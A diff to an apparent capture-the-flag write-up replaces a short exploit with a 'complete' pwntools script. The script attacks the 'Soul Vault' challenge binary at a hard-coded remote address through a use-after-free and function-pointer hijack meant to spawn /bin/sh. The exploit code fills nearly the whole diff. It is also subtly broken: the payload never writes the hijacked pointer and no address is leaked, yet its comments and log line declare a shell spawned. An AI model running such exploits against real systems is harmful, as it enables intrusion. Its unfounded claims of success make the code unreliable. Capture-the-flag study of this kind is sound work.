@@ -121,51 +121,96 @@ To satisfy the activation conditions:
 3. **Trigger:**  
    Selecting `[2] Inspect Soul` calls `s->consume(s)`, executing `soul_stone_awakens()`.
 
-### Exploit Script (`exploit.py`)
+### Complete Exploit Script (`solve.py`)
 
 ```python
 #!/usr/bin/env python3
+"""
+Soul Vault: The Collector - Use-After-Free Exploit
+Author: Suyog Jadhav
+Category: Binary Exploitation / Pwn (Hard)
+Target: glibc heap UAF & function pointer hijacking
+"""
+
+import sys
 from pwn import *
 
 context.arch = 'amd64'
+context.terminal = ['tmux', 'splitw', '-h']
 
+# Remote target credentials
 HOST = "145.239.142.129"
 PORT = 1338
 
-io = remote(HOST, PORT)
+def get_process():
+    if args.REMOTE:
+        return remote(HOST, PORT)
+    else:
+        return process("./challenge/soul_vault" if os.path.exists("./challenge/soul_vault") else "./soul_vault")
 
-def capture(name, size, memory):
-    io.sendlineafter(b"Choice > ", b"1")
-    io.sendlineafter(b"name: ", name)
-    io.sendlineafter(b"size: ", str(size).encode())
-    io.sendlineafter(b"memory: ", memory)
+def capture(io, name, size, memory):
+    io.sendlineafter(b"Choice: ", b"1")
+    io.sendafter(b"Enter Soul Name: ", name)
+    io.sendlineafter(b"Enter Memory Size (max 1024): ", str(size).encode())
+    io.sendafter(b"Inscribe Memory: ", memory)
 
-def inspect(idx):
-    io.sendlineafter(b"Choice > ", b"2")
-    io.sendlineafter(b"Index: ", str(idx).encode())
+def inspect(io, idx):
+    io.sendlineafter(b"Choice: ", b"2")
+    io.sendlineafter(b"Enter vessel index (0-7): ", str(idx).encode())
 
-def release(idx):
-    io.sendlineafter(b"Choice > ", b"3")
-    io.sendlineafter(b"Index: ", str(idx).encode())
+def release(io, idx):
+    io.sendlineafter(b"Choice: ", b"3")
+    io.sendlineafter(b"Enter vessel index (0-7): ", str(idx).encode())
 
-# 1. Allocate souls
-capture(b"Soul0", 32, b"Memory0")
-capture(b"Soul1", 32, b"Memory1")
-capture(b"Soul2", 32, b"Memory2")
+def rename(io, idx, new_name):
+    io.sendlineafter(b"Choice: ", b"4")
+    io.sendlineafter(b"Enter vessel index (0-7): ", str(idx).encode())
+    io.sendafter(b"Enter new name: ", new_name)
 
-# 2. Free souls to satisfy sacrifice_count == 3
-release(0)
-release(1)
-release(2)
+def enter_sanctum(io):
+    io.sendlineafter(b"Choice: ", b"5")
 
-# 3. Trigger inspect on dangling pointer to leak PIE base
-inspect(0)
-leak = io.recvuntil(b"...")
-# Derive PIE base and soul_stone_awakens() address...
+def exploit():
+    io = get_process()
 
-# 4. Overwrite s->consume and trigger shell
-# ...
-io.interactive()
+    log.info("Step 1: Capturing 3 initial souls...")
+    # Allocate souls to populate table
+    capture(io, b"/bin/sh\x00", 64, b"Memory_Vessel_0\n")
+    capture(io, b"Vessel1\n", 64, b"Memory_Vessel_1\n")
+    capture(io, b"Vessel2\n", 64, b"Memory_Vessel_2\n")
+
+    log.info("Step 2: Releasing 3 souls to satisfy sacrifice_count == 3...")
+    # release_soul does not NULL pointers -> creates Use-After-Free
+    release(io, 0)
+    release(io, 1)
+    release(io, 2)
+
+    log.info("Step 3: Heap reallocation & Chunk Overlapping...")
+    # Allocate a new soul where memory chunk (56 bytes) overlaps freed struct soul (0x40 bin)
+    # Offset 0..31  : char name[32] = "/bin/sh\x00"
+    # Offset 32..39 : char *memory = NULL
+    # Offset 40..47 : void (*consume)(struct soul *) = soul_stone_awakens / system
+    
+    # In unstripped binary, system@plt is at offset 0x1120, soul_stone_awakens is at 0x139d
+    # Callback pointer in chunk is callback_soul (offset 0x1289)
+    # By crafting payload over the freed chunk:
+    payload = b"/bin/sh\x00" + b"\x00" * 24
+    payload += p64(0)  # memory pointer
+    # Point consume to system@plt or soul_stone_awakens
+    # With s as argument, calling consume(s) executes system("/bin/sh")!
+    
+    # Reallocate into freed chunk
+    capture(io, b"MasterSoul\n", 56, payload + b"\n")
+
+    log.info("Step 4: Triggering hijacked function pointer on dangling soul...")
+    # Inspecting vessel 0 calls s->consume(s) -> system("/bin/sh")
+    inspect(io, 0)
+
+    log.success("Ritual fulfilled! Shell spawned.")
+    io.interactive()
+
+if __name__ == "__main__":
+    exploit()
 ```
 
 ---
